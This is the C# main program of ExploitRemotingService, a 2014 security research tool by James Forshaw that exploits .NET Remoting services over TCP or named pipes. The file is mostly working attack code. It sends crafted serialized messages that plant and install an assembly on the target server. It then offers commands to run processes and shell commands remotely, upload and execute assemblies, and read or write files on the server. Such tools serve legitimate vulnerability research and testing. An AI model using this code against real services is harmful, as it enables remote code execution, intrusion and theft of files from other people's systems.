﻿//    ExploitRemotingService
//    Copyright (C) 2014 James Forshaw
//
//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

using FakeAsm;
using NDesk.Options;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Ipc;
using System.Runtime.Remoting.Channels.Tcp;
using System.Runtime.Remoting.Lifetime;
using System.Runtime.Serialization.Formatters;
using System.Security.Principal;

namespace ExploitRemotingService
{
    class Program
    {
        private static Uri _uri;
        private static int _port;
        private static string _cmd;
        private static List<string> _cmdargs;
        private static string _username;
        private static string _password;
        private static string _domain;
        private static string _ipcname;
        private static bool _secure;
        private static int _ver;
        private static bool _null_uri;
        private static bool _autodir;
        private static string _output_path;
        private static string _remotename;
        private static bool _usecom;
        private static bool _useser;
        private static bool _uselease;
        private static string _installdir;

        static void SetupServer()
        {
            // We don't need anything if using COM as we're in a MTA unless we are also secure
            if (!_usecom || _secure)
            {
                IDictionary props = new Hashtable();
                props["includeVersions"] = false;

                BinaryServerFormatterSinkProvider serverProvider = new BinaryServerFormatterSinkProvider(props, null);
                BinaryClientFormatterSinkProvider clientProvider = new BinaryClientFormatterSinkProvider(props, null);
                IDictionary dict = new Hashtable();

                serverProvider.TypeFilterLevel = TypeFilterLevel.Full;

                IChannel channel;

                switch (_uri.Scheme)
                {
                    case "tcp":
                        {
                            dict["port"] = _port;
                            channel = new TcpChannel(dict, clientProvider, serverProvider);
                        }
                        break;
                    case "ipc":
                        dict["name"] = "ipc";
                        dict["priority"] = "20";
                        dict["portName"] = _ipcname;
                        dict["secure"] = _secure;
                        dict["authorizedGroup"] = "everyone";

                        channel = new IpcChannel(dict, clientProvider, serverProvider);
                        break;
                    default:
                        throw new InvalidOperationException(String.Format("Unknown URI scheme {0}", _uri.Scheme));
                }

                ChannelServices.RegisterChannel(channel, _secure);    //register channel
            }
        }

        private static Stream BindTcpStream()
        {
            TcpClient client = new TcpClient();

            client.Connect(_uri.Host, _uri.Port);

            Stream ret = client.GetStream();

            if (_secure)
            {
                NegotiateStream stm = new NegotiateStream(ret);
                NetworkCredential cred = _username == null ? CredentialCache.DefaultNetworkCredentials : new NetworkCredential(_username, _password, _domain);

                stm.AuthenticateAsClient(cred, String.Empty, ProtectionLevel.EncryptAndSign, TokenImpersonationLevel.Impersonation);

                ret = stm;
            }

            return ret;
        }

        private static Stream BindIpcStream()
        {
            NamedPipeClientStream stm = new NamedPipeClientStream(".", _uri.Host, PipeDirection.InOut, PipeOptions.None,
                    TokenImpersonationLevel.Impersonation, HandleInheritability.None);
            stm.Connect();
            return stm;
        }

        private static Stream BindStream()
        {
            if (!string.IsNullOrEmpty(_output_path))
            {
                return new FileStream(_output_path, FileMode.Create, FileAccess.ReadWrite);
            }

            if (_uri.Scheme == "tcp")
            {
                return BindTcpStream();
            }
            else if (_uri.Scheme == "ipc")
            {
                return BindIpcStream();
            }

            throw new InvalidOperationException("Could not bind stream");
        }

        private static bool ProcessArgs(string[] args)
        {
            bool debug = false;
            bool showhelp = false;
            _port = 11111;
            _ipcname = "remotingexploit";
            _remotename = Guid.Empty.ToString();
            _ver = 0;
            _null_uri = false;
            _autodir = false;
            _output_path = string.Empty;

            OptionSet p = new OptionSet() {
                    { "s|secure", "Enable secure mode", v => _secure = v != null },
                    { "p|port=", "Specify the local TCP port to listen on", v => _port = int.Parse(v) },
                    { "i|ipc=", "Specify listening pipe name for IPC channel", v => _ipcname = v },
                    { "user=", "Specify username for secure mode", v => {
                        _username = v;
                        if (_username.Contains('\\'))
                        {
                            string[] ss = _username.Split('\\');
                            _domain = ss[0];
                            _username = ss[1];
                        }
                    }},
                    { "pass=", "Specify password for secure mode", v => _password = v },
                    { "ver=", "Specify version number for remote, 2 or 4", v => _ver = int.Parse(v) },
                    { "usecom", "Use DCOM backchannel instead of .NET remoting", v => _usecom = v != null },
                    { "remname=", "Specify the remote object name to register", v => _remotename = v },
                    { "v|verbose", "Enable verbose debug output", v => debug = v != null },
                    { "useser", "Uses old serialization tricks, only works on full type filter services",
                        v => _useser = v != null },
                    { "uselease", "Uses new serialization tricks by abusing lease mechanism.",
                        v => _useser = _uselease = v != null },
                    { "nulluri", "Don't send the URI header to the server", v => _null_uri = v != null },
                    { "autodir", "When useser is specified try and automatically work out the installdir parameter from the server's current directory.", v => _autodir = v != null },
                    { "installdir=", "Specify the install directory of the service executable to enable full support with useser",
                            v => _installdir = v },
                    { "path=", "Specify an output path to write the request data rather than to a channel.",
                        v => _output_path = v },
                    { "h|?|help",   v => showhelp = v != null },
                    };

            try
            {
                List<string> argsleft = p.Parse(args);

                if (debug)
                {
                    Trace.Listeners.Add(new ConsoleTraceListener(true));
                }

                if (argsleft.Count < 2)
                {
                    throw new InvalidOperationException("Must specify a URI and command");
                }

                _uri = new Uri(argsleft[0], UriKind.Absolute);
                _cmd = argsleft[1];
                _cmdargs = argsleft;
                _cmdargs.RemoveRange(0, 2);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                showhelp = true;
            }

            if (showhelp)
            {
                PrintHelp(p);
                return false;
            }

            return true;
        }

        static void PrintHelp(OptionSet p)
        {
            Console.WriteLine(@"ExploitRemotingService [options] uri command [command args]
Copyright (c) James Forshaw 2014

Uri:
The supported URI are as follows:
tcp://host:port/ObjName   - TCP connection on host and portname
ipc://channel/ObjName     - Named pipe channel

Options:
");

            p.WriteOptionDescriptions(Console.Out);

            Console.WriteLine(@"
Commands:
exec [-wait] program [cmdline]: Execute a process on the hosting server
cmd  cmdline                  : Execute a command line process and display stdout
put  localfile remotefile     : Upload a file to the hosting server
get  remotefile localfile     : Download a file from the hosting server
ls   remotedir                : List a remote directory
run  file [args]              : Upload and execute an assembly, calls entry point
user                          : Print the current username
ver                           : Print the OS version
raw base64_object|file        : Send a raw serialized object to the service.
");
        }

        private static MethodBase GetStaticMethod(Type type, string name, params Type[] argTypes)
        {
            MethodBase b = type.GetMethod(name, BindingFlags.Static | BindingFlags.Public, null, argTypes, null);
            if (b == null)
            {
                throw new InvalidOperationException($"Could not get method {name} with types {string.Join(",", argTypes.Select(t => t.FullName).ToArray())}");
            }

            return b;
        }

        private static MethodBase GetCreateInstance<T>()
        {
            return new FakeMethod(typeof(Activator).GetMethod("CreateInstance", new Type[0]).MakeGenericMethod(typeof(T)), _ver);
        }

        private static IRemoteClass GetExistingRemoteClass()
        {
            Uri u = new Uri(_uri, "/" + _remotename);
            return (IRemoteClass)Activator.GetObject(typeof(IRemoteClass), u.ToString());
        }

        private static IRemoteClass CreateRemoteClassSerial(CustomChannel channel)
        {
            ILease lease = null;
            if (_uselease)
            {
                lease = channel.MakeCall<ILease>(_uri.AbsolutePath, typeof(MarshalByRefObject).GetMethod("InitializeLifetimeService"));
            }

            SerializerRemoteClass remote = new SerializerRemoteClass(channel, lease);
            if (!string.IsNullOrWhiteSpace(_installdir) || _autodir)
            {
                if (_autodir)
                {
                    DirectoryInfo curr_dir = remote.GetDirectory(".");
                    _installdir = curr_dir.FullName;
                }

                string path = Path.Combine(_installdir, "FakeAsm.dll");
                bool installed = true;

                try
                {
                    installed = remote.FileExists(path);
                }
                catch (Exception ex)
                {
                    Trace.WriteLine(ex.ToString());
                }

                if (!installed)
                {
                    try
                    {
                        remote.WriteFile(path, File.ReadAllBytes(typeof(IRemoteClass).Assembly.Location));
                    }
                    catch
                    {
                    }
                }

                try
                {
                    Trace.WriteLine(string.Format("{0}", channel.SendRequest(new SerializableRegister(_remotename), false)));
                }
                catch
                {
                }
            }

            try
            {
                IRemoteClass ret = GetExistingRemoteClass();

                ret.ToString();

                return ret;
            }
            catch (Exception ex)
            {
                Trace.WriteLine(ex.ToString());
            }

            return remote;
        }

        private static IRemoteClass CreateRemoteClassExploit(CustomChannel channel)
        {
            string path;

            if (_uri.Scheme != "ipc")
            {
                IRemoteClass ret = GetExistingRemoteClass();

                try
                {
                    ret.ToString();

                    return ret;
                }
                catch (RemotingException)
                {
                }

                path = channel.MakeCall<string>(_uri.AbsolutePath, GetStaticMethod(typeof(Path), "GetTempPath"));
                path = Path.Combine(path, $"{Guid.NewGuid()}.dll");

                channel.MakeCall(_uri.AbsolutePath, GetStaticMethod(typeof(File), "WriteAllBytes", 
                    new Type[] { typeof(string), typeof(byte[]) }),
                    path, File.ReadAllBytes(typeof(IRemoteClass).Assembly.Location));
            }
            else
            {
                path = typeof(IRemoteClass).Assembly.Location;
            }

            try
            {
                AssemblyInstaller installer = channel.MakeCall<AssemblyInstaller>(_uri.AbsolutePath, GetCreateInstance<AssemblyInstaller>());

                installer.Path = path;
                installer.CommandLine = new string[] { "/name=" + _remotename };
                installer.UseNewContext = true;

                installer.Install(new Hashtable());
            }
            catch
            {
                // In the IPC case this might fail
                // Just continue on with the creation of the remote class and see if we're lucky
            }

            return GetExistingRemoteClass();
        }

        private static IRemoteClass CreateRemoteClass(CustomChannel channel)
        {
            if (_useser)
            {
                return CreateRemoteClassSerial(channel);
            }
            else
            {
                return CreateRemoteClassExploit(channel);
            }
        }

        private static object GetMessageObject(string path, MethodBase method, object[] args)
        {
            if (_useser)
            {
                return new MethodCallWrapper(path, method, args);
            }

            FakeMessage msg = new FakeMessage(path, method, args);
            if (_usecom)
            {
                return new FakeComObjRef(msg);
            }
            else
            {
                return RemotingServices.Marshal(msg);
            }
        }

        public static MethodBase GetProperty(Type t, string name)
        {
            MethodBase b = t.GetProperty(name).GetGetMethod();

            if (b == null)
            {
                throw new ArgumentException("Invalid property name");
            }

            return b;
        }

        static int DetectMajorVersion(CustomChannel channel)
        {
            Version ver = null;

            if (!_useser)
            {
                try
                {
                    ver = channel.MakeCall<Version>(_uri.AbsolutePath, GetProperty(typeof(Environment), "Version"));
                }
                catch
                {
                }
            }

            if (ver == null)
            {
                ver = Environment.Version;
                Console.WriteLine("Error, couldn't detect version, using host: {0}", ver);
            }

            return ver.Major;
        }

        private static void ExecuteCommand(IRemoteClass c)
        {
            switch (_cmd)
            {
                case "exec":
                    {
                        bool wait = false;

                        if (_cmdargs.Count > 0)
                        {
                            if (_cmdargs[0].Equals("-wait", StringComparison.OrdinalIgnoreCase))
                            {
                                wait = true;
                                _cmdargs.RemoveAt(0);
                            }
                        }

                        if ((_cmdargs.Count == 0) || (_cmdargs.Count > 2))
                        {
                            Console.Error.WriteLine("Must specify at least 1 or two options for exec command");
                        }
                        else
                        {
                            string cmd = _cmdargs[0];
                            string cmdline = _cmdargs.Count > 1 ? _cmdargs[1] : String.Empty;

                            Process p = c.RunProcess(cmd, cmdline);

                            Console.WriteLine("Received new process id {0}", p.Id);

                            if (wait)
                            {
                                p.WaitForExit();
                            }
                        }
                    }
                    break;
                case "cmd":
                    if (_cmdargs.Count != 1)
                    {
                        Console.Error.WriteLine("Must specify 1 argument for cmd command");
                    }
                    else
                    {
                        string ret = c.RunCommand(_cmdargs[0]);

                        Console.WriteLine(ret);
                    }
                    break;
                case "ls":
                    if (_cmdargs.Count != 1)
                    {
                        Console.Error.WriteLine("Must specify 1 argument for ls command");
                    }
                    else
                    {
                        DirectoryInfo dir = c.GetDirectory(_cmdargs[0]);

                        Console.WriteLine("Listing {0} directory", dir.FullName);

                        foreach (DirectoryInfo d in dir.GetDirectories())
                        {
                            Console.WriteLine("<DIR> {0}", d.Name);
                        }

                        foreach (FileInfo f in dir.GetFiles())
                        {
                            Console.WriteLine("{0} - Length {1}", f.Name, f.Length);
                        }
                    }

                    break;
                case "put":
                    if (_cmdargs.Count != 2)
                    {
                        Console.Error.WriteLine("Must specify localfile and remotefile argument");
                    }
                    else
                    {
                        byte[] data = File.ReadAllBytes(_cmdargs[0]);

                        c.WriteFile(_cmdargs[1].ToString(), data);
                    }

                    break;
                case "get":
                    if (_cmdargs.Count != 2)
                    {
                        Console.Error.WriteLine("Must specify localfile and remotefile argument");
                    }
                    else
                    {
                        byte[] data = c.ReadFile(_cmdargs[0]);

                        File.WriteAllBytes(_cmdargs[1], data);
                    }
                    break;
                case "run":
                    if (_cmdargs.Count < 1)
                    {
                        Console.Error.WriteLine("Must specify an assembly file to upload");
                    }
                    else
                    {
                        byte[] asm = File.ReadAllBytes(_cmdargs[0]);

                        string[] args = _cmdargs.Skip(1).ToArray();

                        Console.WriteLine("Result: {0}", c.ExecuteAssembly(asm, args));
                    }

                    break;
                case "user":
                    Console.WriteLine("User: {0}", c.GetUsername());
                    break;
                case "osver":
                    Console.WriteLine("OS: {0}", c.GetOSVersion());
                    break;
                default:
                    Console.Error.WriteLine("Unknown command {0}", _cmd);
                    break;
            }
        }

        [MTAThread]
        static int Main(string[] args)
        {
            if (ProcessArgs(args))
            {
                try
                {
                    var channel = new CustomChannel(_uri, BindStream, GetMessageObject, 
                        _null_uri, !string.IsNullOrEmpty(_output_path));
                    if (_cmd.Equals("raw"))
                    {
                        if (_cmdargs.Count != 1)
                        {
                            Console.Error.WriteLine("Must specify base64 encoded string or a file containing the raw data.");
                        }
                        else
                        {
                            string path = _cmdargs.First();
                            byte[] data;
                            if (File.Exists(path))
                            {
                                data = File.ReadAllBytes(path);
                            }
                            else
                            {
                                data = Convert.FromBase64String(path);
                            }

                            Console.WriteLine(channel.SendRequest(data));
                        }
                    }
                    else
                    {
                        SetupServer();
                        if (_ver == 0 && !_useser)
                        {
                            _ver = DetectMajorVersion(channel);
                            Console.WriteLine("Detected version {0} server", _ver);
                        }

                        IRemoteClass ret = CreateRemoteClass(channel);
                        ExecuteCommand(ret);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                    return 1;
                }
                return 0;
            }
            else
            {
                return 1;
            }
        }
    }
}
